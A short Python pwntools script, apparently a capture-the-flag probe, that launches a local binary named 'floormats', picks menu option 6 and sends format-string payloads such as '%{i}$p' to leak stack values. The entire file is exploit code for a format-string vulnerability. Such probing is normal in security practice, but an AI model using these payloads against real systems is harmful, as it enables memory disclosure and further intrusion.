from pwn import *

for i in range(20):
    io = process("./floormats")

    io.sendlineafter("choice:", b"6")

    #payload = f"${i}%s\n"
    payload = f"%{i}$p"

    io.sendlineafter("address", payload.encode())

    io.interactive()

